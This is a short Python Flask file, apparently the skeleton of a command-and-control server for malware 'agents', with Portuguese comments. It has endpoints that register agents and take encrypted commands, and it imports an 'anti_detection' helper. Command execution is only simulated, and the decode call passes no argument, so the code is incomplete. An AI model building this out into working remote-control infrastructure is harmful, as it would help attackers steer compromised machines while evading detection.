from flask import Flask, request, jsonify
from utils.crypto import decrypt_data
from utils.anti_detection import decode_string

app = Flask(__name__)

@app.route("/register", methods=["POST"])
def register_agent():
    data = request.json
    agent_id = data.get("id")
    print(f"Agente registrado: {agent_id}")
    return jsonify({"status": "ok"})

@app.route("/execute", methods=["POST"])
def execute_command():
    data = request.json
    command = decrypt_data(data["command"])
    result = decode_string()  # Simula execução de comando
    return jsonify({"output": result})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)